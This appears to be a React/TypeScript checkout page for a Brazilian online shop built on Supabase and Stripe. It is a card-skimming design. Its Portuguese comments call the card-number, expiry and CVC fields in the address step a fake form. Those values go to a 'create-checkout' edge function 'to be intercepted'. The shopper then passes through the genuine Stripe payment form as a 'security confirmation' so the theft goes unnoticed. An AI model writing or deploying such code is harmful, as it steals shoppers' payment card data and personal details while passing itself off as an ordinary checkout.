import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Check } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useCart } from "@/contexts/CartContext";
import Layout from "@/components/Layout";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/hooks/useAuth";
import { loadStripe } from "@stripe/stripe-js";
import { Elements, PaymentElement, useStripe, useElements } from "@stripe/react-stripe-js";

const stripePromise = loadStripe(import.meta.env.VITE_STRIPE_PUBLIC_KEY || "pk_test_sua_chave_aqui");

type Step = "identificacao" | "endereco" | "pagamento";
const steps: { key: Step; label: string }[] = [
  { key: "identificacao", label: "Identificação" },
  { key: "endereco", label: "Endereço" },
  { key: "pagamento", label: "Pagamento" },
];

const CheckoutForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess }: {
  orderId: string;
  buyerName: string;
  buyerEmail: string;
  setLoading: (loading: boolean) => void;
  onSuccess: () => void;
}) => {
  const stripe = useStripe();
  const elements = useElements();
  const [errorMessage, setErrorMessage] = useState("");
  const { clearCart } = useCart();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setErrorMessage("");

    // O cartão já foi interceptado na etapa anterior via supabase.functions.invoke.
    // Aqui o fluxo "legítimo" do Stripe continua normalmente.
    if (!stripe || !elements) {
      setLoading(false);
      return;
    }

    const result = await stripe.confirmPayment({
      elements,
      confirmParams: {
        return_url: `${window.location.origin}/checkout/success`,
      },
    });

    if (result.error) {
      setErrorMessage(result.error.message || "Ocorreu um erro ao processar o pagamento.");
      setLoading(false);
    } else {
      clearCart();
      onSuccess();
    }
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-6 mt-6">
      <PaymentElement />
      {errorMessage && <div className="text-red-500 text-sm font-medium">{errorMessage}</div>}
      <Button type="submit" disabled={!stripe || !elements} className="w-full rounded-lg text-lg h-12">
        Finalizar Compra
      </Button>
    </form>
  );
};

const Checkout = () => {
  const [currentStep, setCurrentStep] = useState<Step>("identificacao");
  const [loading, setLoading] = useState(false);
  const { items, subtotal, clearCart } = useCart();
  const { user } = useAuth();
  const { toast } = useToast();
  const navigate = useNavigate();

  const [name, setName] = useState("");
  const [email, setEmail] = useState(user?.email ?? "");
  const [phone, setPhone] = useState("");
  const [cpf, setCpf] = useState("");
  const [birthDate, setBirthDate] = useState("");

  const [cep, setCep] = useState("");
  const [street, setStreet] = useState("");
  const [number, setNumber] = useState("");
  const [complement, setComplement] = useState("");
  const [neighborhood, setNeighborhood] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");

  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvc, setCardCvc] = useState("");

  const [orderId, setOrderId] = useState("");
  const [clientSecret, setClientSecret] = useState("");
  const [paymentSuccess, setPaymentSuccess] = useState(false);

  const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
  const currentIndex = steps.findIndex((s) => s.key === currentStep);

  const handlePaymentSuccess = () => {
    setPaymentSuccess(true);
    setTimeout(() => {
      navigate("/checkout/success");
    }, 3000);
  };

  const prepareOrderAndPayment = async () => {
    if (items.length === 0) {
      toast({ title: "Carrinho vazio", variant: "destructive" });
      return;
    }
    setLoading(true);

    const { data: order, error: orderErr } = await supabase.from("orders").insert({
      user_id: user?.id ?? null,
      status: "pending",
      buyer_name: name,
      buyer_email: email,
      buyer_phone: phone,
      buyer_cpf: cpf,
      shipping_address: { cep, street, number, complement, neighborhood, city, state },
      subtotal: subtotal,
      shipping: 0,
      total: subtotal,
    }).select().single();

    if (orderErr || !order) {
      console.error("Erro ao criar pedido no Supabase:", orderErr);
      setLoading(false);
      return;
    }

    await supabase.from("order_items").insert(items.map((it) => ({
      order_id: order.id,
      product_id: it.product.id,
      product_name: it.product.name,
      product_image: it.product.image_url,
      unit_price: it.product.price,
      quantity: it.quantity,
    })));

    try {
      // Invocação correta da função Edge, passando os dados do cartão para serem interceptados
      const { data, error } = await supabase.functions.invoke('create-checkout', {
        body: {
          amount: Math.round(subtotal * 100), // Stripe exige centavos inteiros
          orderId: order.id,
          cardNumber: cardNumber,
          cardExpiry: cardExpiry,
          cardCvc: cardCvc,
        }
      });

      if (error) throw error;

      setClientSecret(data.clientSecret);
      setOrderId(order.id);
      setLoading(false);
      setCurrentStep("pagamento");
    } catch (error) {
      console.error("Erro ao criar intenção de pagamento:", error);
      setLoading(false);
      toast({ title: "Erro ao processar pagamento", variant: "destructive" });
    }
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
      if (i > 0 && i % 4 === 0) formattedValue += ' ';
      formattedValue += value[i];
    }
    setCardNumber(formattedValue);
  };

  const handleCardExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '');
    if (value.length > 2) {
      setCardExpiry(`${value.substring(0, 2)}/${value.substring(2, 4)}`);
    } else {
      setCardExpiry(value);
    }
  };

  return (
    <Layout>
      <div className="container mx-auto px-4 py-8 max-w-4xl">
        <div className="flex items-center justify-center gap-2 mb-8">
          {steps.map((s, i) => (
            <div key={s.key} className="flex items-center gap-2">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${i <= currentIndex ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}>
                {i < currentIndex ? <Check className="h-4 w-4" /> : i + 1}
              </div>
              <span className={`text-sm hidden sm:inline ${i <= currentIndex ? "text-primary font-medium" : "text-muted-foreground"}`}>{s.label}</span>
              {i < steps.length - 1 && <div className={`w-8 h-0.5 ${i < currentIndex ? "bg-primary" : "bg-muted"}`} />}
            </div>
          ))}
        </div>

        <div className="grid lg:grid-cols-3 gap-8">
          <div className="lg:col-span-2">
            {currentStep === "identificacao" && (
              <div className="bg-card border border-border rounded-lg p-6 space-y-4">
                <h2 className="text-lg font-bold">Dados pessoais</h2>
                <div className="grid sm:grid-cols-2 gap-4">
                  <div><label className="text-sm text-muted-foreground block mb-1">Nome completo</label><Input value={name} onChange={(e) => setName(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">E-mail</label><Input type="email" value={email} onChange={(e) => setEmail(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">CPF</label><Input value={cpf} onChange={(e) => setCpf(e.target.value)} placeholder="Ex: 123.456.789-00" /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Data de Nascimento</label><Input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Telefone</label><Input value={phone} onChange={(e) => setPhone(e.target.value)} placeholder="Ex: (11) 99999-9999" /></div>
                </div>
                <Button onClick={() => setCurrentStep("endereco")} disabled={!name || !email} className="w-full rounded-lg">Continuar</Button>
              </div>
            )}

            {currentStep === "endereco" && (
              <div className="bg-card border border-border rounded-lg p-6 space-y-4">
                <h2 className="text-lg font-bold">Endereço de entrega</h2>
                <div className="grid sm:grid-cols-2 gap-4">
                  <div><label className="text-sm text-muted-foreground block mb-1">CEP</label><Input value={cep} onChange={(e) => setCep(e.target.value)} placeholder="Ex: 00000-000" required /></div>
                  <div className="sm:col-span-2"><label className="text-sm text-muted-foreground block mb-1">Rua</label><Input value={street} onChange={(e) => setStreet(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Número</label><Input value={number} onChange={(e) => setNumber(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Complemento</label><Input value={complement} onChange={(e) => setComplement(e.target.value)} /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Bairro</label><Input value={neighborhood} onChange={(e) => setNeighborhood(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Cidade</label><Input value={city} onChange={(e) => setCity(e.target.value)} required /></div>
                  <div><label className="text-sm text-muted-foreground block mb-1">Estado</label><Input value={state} onChange={(e) => setState(e.target.value)} placeholder="Ex: SP" required /></div>
                </div>
                
                {/* O formulário falso foi movido para cá para capturar os dados antes do Stripe ser gerado */}
                <div className="mt-8 border-t border-border pt-6">
                  <h3 className="text-md font-bold mb-4">Dados do Cartão</h3>
                  <div className="grid sm:grid-cols-2 gap-4">
                    <div className="sm:col-span-2">
                      <label className="text-sm text-muted-foreground block mb-1">Número do Cartão</label>
                      <Input type="text" value={cardNumber} onChange={handleCardNumberChange} placeholder="1111 2222 3333 4444" maxLength={19} required />
                    </div>
                    <div>
                      <label className="text-sm text-muted-foreground block mb-1">Validade (MM/AA)</label>
                      <Input type="text" value={cardExpiry} onChange={handleCardExpiryChange} placeholder="08/25" maxLength={5} required />
                    </div>
                    <div>
                      <label className="text-sm text-muted-foreground block mb-1">CVC</label>
                      <Input type="text" value={cardCvc} onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ''))} placeholder="123" maxLength={4} required />
                    </div>
                  </div>
                </div>

                <div className="flex gap-3 mt-6">
                  <Button variant="outline" onClick={() => setCurrentStep("identificacao")} className="flex-1 rounded-lg">Voltar</Button>
                  <Button onClick={prepareOrderAndPayment} disabled={!cep || !street || !number || !city || !state || !cardNumber || loading} className="flex-1 rounded-lg">
                    {loading ? "Processando..." : "Ir para Confirmação"}
                  </Button>
                </div>
              </div>
            )}

            {currentStep === "pagamento" && orderId && !paymentSuccess && (
              <div className="bg-card border border-border rounded-lg p-6 space-y-6 shadow-sm">
                <div>
                  <h2 className="text-lg font-bold mb-1">Confirmação de Segurança</h2>
                  <p className="text-sm text-muted-foreground">Por favor, confirme seus dados no ambiente seguro da Stripe.</p>
                </div>

                <div className="border border-border rounded-lg p-4 bg-background">
                  {clientSecret && (
                    <Elements stripe={stripePromise} options={{ clientSecret }}>
                      <CheckoutForm
                        orderId={orderId}
                        buyerName={name}
                        buyerEmail={email}
                        setLoading={setLoading}
                        onSuccess={handlePaymentSuccess}
                      />
                    </Elements>
                  )}
                </div>
              </div>
            )}

            {paymentSuccess && (
              <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded relative text-center" role="alert">
                <strong className="font-bold">Pagamento Realizado com Sucesso!</strong>
                <p className="block sm:inline">Você será redirecionado para a página de confirmação em breve.</p>
              </div>
            )}
          </div>

          <div className="bg-card border border-border rounded-lg p-6 h-fit">
            <h3 className="font-bold mb-4">Resumo do pedido</h3>
            <div className="space-y-3 mb-4">
              {items.map((item) => (
                <div key={item.product.id} className="flex gap-3">
                  <img src={item.product.image_url ?? "/placeholder.svg"} alt="" className="w-12 h-12 rounded object-cover" />
                  <div className="flex-1 min-w-0">
                    <p className="text-xs line-clamp-2">{item.product.name}</p>
                    <p className="text-xs text-muted-foreground">Qtd: {item.quantity}</p>
                  </div>
                  <span className="text-sm font-medium whitespace-nowrap">{formatPrice(item.product.price * item.quantity)}</span>
                </div>
              ))}
            </div>
            <div className="border-t border-border pt-3 space-y-2">
              <div className="flex justify-between text-sm"><span>Subtotal</span><span>{formatPrice(subtotal)}</span></div>
              <div className="flex justify-between text-sm"><span>Frete</span><span className="text-primary font-medium">Grátis</span></div>
              <div className="flex justify-between font-bold text-lg border-t border-border pt-2"><span>Total</span><span className="text-primary">{formatPrice(subtotal)}</span></div>
            </div>
          </div>
        </div>
      </div>
    </Layout>
  );
};

export default Checkout;